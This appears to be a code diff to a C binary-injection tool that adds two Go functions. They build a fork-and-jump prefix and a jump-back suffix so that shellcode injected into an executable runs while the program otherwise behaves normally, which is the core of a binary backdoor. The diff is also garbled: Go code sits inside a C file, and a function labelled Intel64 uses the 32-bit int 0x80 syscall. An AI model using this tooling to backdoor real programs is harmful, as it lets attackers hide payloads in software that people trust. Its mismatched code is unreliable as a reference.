@@ -65,6 +65,41 @@ char *apply_suffix_jmp_intel32(char *shellcode,uint32_t shellcodevaddr,uint32_t 
             jmp_shellcode[i+6]=0x24;
             return jmp_shellcode;
            }
+           func ApplyPrefixForkIntel64(shellcode []byte, entryJump uint32, byteOrder binary.ByteOrder) []byte {
+	/*
+		Disassembly:
+		0:  b8 02 00 00 00          mov    eax,0x2
+		5:  cd 80                   int    0x80
+		7:  83 f8 00                cmp    eax,0x0
+		a:  0f 85 xx xx xx xx       jne    <entryJump>
+	*/
+	prefix := bytes.NewBuffer([]byte{0xB8, 0x02, 0x00, 0x00, 0x00, 0xCD, 0x80, 0x83, 0xF8,
+		0x00, 0x0F, 0x85})
+	w := bufio.NewWriter(prefix)
+	binary.Write(w, byteOrder, entryJump)
+	binary.Write(w, byteOrder, shellcode)
+	w.Flush()
+	return prefix.Bytes()
+}
+
+// ApplySuffixJmpIntel64 - Appends instructions to jump to the original entryPoint (the parameter)
+//							Intel x64 Linux version
+//
+//							Returns the resulting shellcode
+func ApplySuffixJmpIntel64(shellcode []byte, shellcodeVaddr uint32, entryPoint uint32, byteOrder binary.ByteOrder) []byte {
+	/*
+		Disassembly:
+		0:  e9 00 00 00 00          jmp    <entryJump>
+	*/
+
+	retval := append(shellcode, 0xe9)
+	buf := bytes.NewBuffer(retval)
+	w := bufio.NewWriter(buf)
+	entryJump := entryPoint - (shellcodeVaddr + 5) - uint32(len(shellcode))
+	binary.Write(w, byteOrder, entryJump)
+	w.Flush()
+	return buf.Bytes()
+}
 int binject(char *file,char *shellcode)
            {
             int type;
